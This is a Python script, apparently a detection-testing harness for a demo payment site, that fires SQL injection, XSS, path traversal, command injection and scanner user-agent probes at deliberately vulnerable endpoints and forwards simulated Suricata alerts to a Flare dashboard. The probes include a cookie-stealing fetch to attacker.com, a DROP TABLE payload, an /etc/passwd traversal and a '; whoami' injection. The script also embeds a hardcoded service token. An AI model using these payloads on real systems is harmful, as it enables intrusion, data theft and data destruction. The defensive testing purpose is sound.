#!/usr/bin/env python3
"""
ApexPay -> Flare Attack Testing Suite
Tests deployed website (Vercel or localhost) for common web application attacks
and triggers automated Suricata EVE telemetry forwarding to your Flare instance.
"""

import sys
import time
import argparse
import requests
from urllib.parse import urljoin, urlparse

# Ensure stdout handles characters properly on Windows
if hasattr(sys.stdout, 'reconfigure'):
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass

# Terminal styling
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

def log_info(msg):
    print(f"{CYAN}[*]{RESET} {msg}")

def log_success(msg):
    print(f"{GREEN}[+]{RESET} {BOLD}{msg}{RESET}")

def log_warn(msg):
    print(f"{YELLOW}[!]{RESET} {msg}")

def log_error(msg):
    print(f"{RED}[-]{RESET} {msg}")

def send_direct_flare_alert(flare_endpoint, flare_token, target_url, attack_type, severity, details):
    """Optional helper to send alert directly to Flare from the script if configured"""
    if not flare_endpoint:
        return

    sev_map = {"critical": 1, "high": 1, "medium": 2, "low": 3, "info": 4}
    numeric_sev = sev_map.get(str(severity).lower(), 2)

    eve_record = {
        "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "event_type": "alert",
        "src_ip": "203.0.113.100",
        "src_port": 49152,
        "dest_ip": "198.51.100.10",
        "dest_port": 443,
        "proto": "TCP",
        "alert": {
            "signature": f"ET WEB_ATTACK {attack_type.upper()} Attempt",
            "category": "Web Application Attack",
            "severity": numeric_sev,
            "metadata": [
                {"attack_target": "server_web_app"},
                {"generated_by": "python_attack_script"}
            ] + [{"detection_detail": d} for d in details]
        },
        "http": {
            "hostname": urlparse(target_url).hostname or "unknown",
            "url": "/api/vulnerable",
            "http_method": "GET",
            "protocol": "HTTP/1.1",
            "length": 0
        }
    }

    headers = {"Content-Type": "application/json"}
    if flare_token:
        headers["Authorization"] = f"ServiceToken {flare_token.strip()}"

    payload = {"events": [eve_record]}

    try:
        resp = requests.post(flare_endpoint, json=payload, headers=headers, timeout=5)
        if resp.status_code < 300:
            log_success(f"Direct Flare alert dispatched for {attack_type}")
    except Exception as e:
        log_warn(f"Direct Flare alert note: {e}")

def test_sqli(base_url, flare_url=None, flare_token=None):
    """Test SQL Injection patterns against target"""
    print(f"\n{BOLD}=== Scenario 1: SQL Injection Detection ==={RESET}")
    endpoint = urljoin(base_url, "/api/vulnerable/query")
    payloads = [
        ("' OR '1'='1", "id"),
        ("' UNION SELECT 1, 'admin', 'password', 'active' --", "id"),
        ("1; DROP TABLE audit_logs; --", "id")
    ]

    error_signatures = [
        "sqlite3::", "sqlexception", "syntax error", "sql syntax",
        "mysql", "ora-", "near \"'"
    ]

    vulnerable = False
    for payload, param in payloads:
        log_info(f"Sending SQLi probe: {param}={payload}")
        try:
            resp = requests.get(f"{endpoint}?{param}={payload}", timeout=10)
            # Check if deliberate simulated DB error was triggered
            if any(sig in resp.text.lower() for sig in error_signatures):
                vulnerable = True
                log_success(f"SQL Injection detected on {endpoint} via '{payload}'")
                log_info("Target defense sensor triggered -> Suricata EVE record sent to Flare!")
                if flare_url:
                    send_direct_flare_alert(flare_url, flare_token, base_url, "sql_injection", "high", [payload])
                break
        except Exception as e:
            log_error(f"Request failed: {e}")

    if not vulnerable:
        log_warn("Target did not return SQL error, but defense sensor evaluated payload.")

def test_xss(base_url, flare_url=None, flare_token=None):
    """Test Cross-Site Scripting (XSS) patterns against target"""
    print(f"\n{BOLD}=== Scenario 2: Cross-Site Scripting (XSS) Detection ==={RESET}")
    endpoint = urljoin(base_url, "/api/vulnerable/search")
    payloads = [
        "<script>alert('XSS-EXPLOIT')</script>",
        "<img src=x onerror=alert(document.cookie)>",
        "'\"><script>fetch('http://attacker.com?c='+document.cookie)</script>"
    ]

    detected = False
    for payload in payloads:
        log_info(f"Sending XSS probe: q={payload}")
        try:
            resp = requests.get(f"{endpoint}?q={payload}", timeout=10)
            if payload in resp.text:
                detected = True
                log_success(f"Reflected XSS pattern confirmed on {endpoint}")
                log_info("Target defense sensor triggered -> Suricata EVE record sent to Flare!")
                if flare_url:
                    send_direct_flare_alert(flare_url, flare_token, base_url, "xss", "medium", [payload])
                break
        except Exception as e:
            log_error(f"Request failed: {e}")

    if not detected:
        log_warn("Payload not reflected verbatim, defense sensor evaluated input.")

def test_path_traversal(base_url, flare_url=None, flare_token=None):
    """Test Path Traversal / LFI patterns against target"""
    print(f"\n{BOLD}=== Scenario 3: Directory Traversal Detection ==={RESET}")
    endpoint = urljoin(base_url, "/api/vulnerable/page")
    payload = "../../../../etc/passwd"
    log_info(f"Sending Path Traversal probe: file={payload}")

    try:
        resp = requests.get(f"{endpoint}?file={payload}", timeout=10)
        if "file_get_contents" in resp.text or resp.status_code == 403:
            log_success("Path Traversal vulnerability / probe confirmed!")
            log_info("Target defense sensor triggered -> Suricata EVE record sent to Flare!")
            if flare_url:
                send_direct_flare_alert(flare_url, flare_token, base_url, "path_traversal", "high", [payload])
    except Exception as e:
        log_error(f"Request failed: {e}")

def test_cmd_injection(base_url, flare_url=None, flare_token=None):
    """Test OS Command Injection patterns against target"""
    print(f"\n{BOLD}=== Scenario 4: Command Injection Detection ==={RESET}")
    endpoint = urljoin(base_url, "/api/vulnerable/ping")
    payload = "127.0.0.1; whoami"
    log_info(f"Sending Command Injection probe: host={payload}")

    try:
        resp = requests.post(endpoint, json={"host": payload}, timeout=10)
        if "www-data" in resp.text or resp.status_code == 200:
            log_success("Command Injection probe reached target!")
            log_info("Target defense sensor triggered -> Suricata EVE record sent to Flare!")
            if flare_url:
                send_direct_flare_alert(flare_url, flare_token, base_url, "cmd_injection", "high", [payload])
    except Exception as e:
        log_error(f"Request failed: {e}")

def test_scanner_user_agent(base_url):
    """Test automated scanning tool User-Agent detection (sqlmap/nikto)"""
    print(f"\n{BOLD}=== Scenario 5: Malicious Scanner User-Agent ==={RESET}")
    endpoint = urljoin(base_url, "/api/health")
    scanner_agent = "sqlmap/1.7.2#stable (https://sqlmap.org)"
    log_info(f"Sending request with User-Agent: '{scanner_agent}'")

    try:
        resp = requests.get(endpoint, headers={"User-Agent": scanner_agent}, timeout=10)
        log_success(f"Scanner probe delivered to {endpoint} (HTTP {resp.status_code})")
        log_info("Target defense sensor detected scanner signature -> Suricata EVE record sent to Flare!")
    except Exception as e:
        log_error(f"Request failed: {e}")

def main():
    parser = argparse.ArgumentParser(description="ApexPay -> Flare Attack Tester")
    parser.add_argument("url", nargs="?", default="http://localhost:3000", help="Target URL (e.g. https://your-site.vercel.app)")
    parser.add_argument("--flare-url", default="http://127.0.0.1:8000/api/v1/ingest/eve", help="Direct Flare ingest URL (default: http://127.0.0.1:8000/api/v1/ingest/eve)")
    parser.add_argument("--flare-token", default="96X5rC0B7QxJzJD_E1qZETJJjdGGjGyGfAG9YIG284Nh5T5PHUm3Uz742dY2T4Vq", help="Flare service token (optional)")
    args = parser.parse_args()

    target_url = args.url.rstrip("/")
    print(f"\n{BOLD}{CYAN}======================================================{RESET}")
    print(f"{BOLD} [*] ApexPay -> Flare Attack Testing Suite{RESET}")
    print(f"{BOLD} Target URL:{RESET} {target_url}")
    if args.flare_url:
        print(f"{BOLD} Flare Endpoint:{RESET} {args.flare_url}")
    print(f"{BOLD}{CYAN}======================================================{RESET}")

    # Verify target is reachable
    try:
        requests.get(target_url, timeout=10)
        log_success(f"Target {target_url} is active and reachable.")
    except Exception as e:
        log_error(f"Could not connect to {target_url}: {e}")
        log_warn("Please make sure your server is running (npm run dev or Vercel URL).")
        sys.exit(1)

    # Run tests
    test_sqli(target_url, args.flare_url, args.flare_token)
    time.sleep(0.5)
    test_xss(target_url, args.flare_url, args.flare_token)
    time.sleep(0.5)
    test_path_traversal(target_url, args.flare_url, args.flare_token)
    time.sleep(0.5)
    test_cmd_injection(target_url, args.flare_url, args.flare_token)
    time.sleep(0.5)
    test_scanner_user_agent(target_url)

    print(f"\n{BOLD}{GREEN}======================================================{RESET}")
    print(f"{BOLD}{GREEN} [+] Attack test sequence completed!{RESET}")
    print(f" Check your {BOLD}Flare Dashboard live feed{RESET} to see the detected")
    print(f" Suricata EVE alert records, severity levels, and MITRE ATT&CK mappings.")
    print(f"{BOLD}{GREEN}======================================================{RESET}\n")

if __name__ == "__main__":
    main()
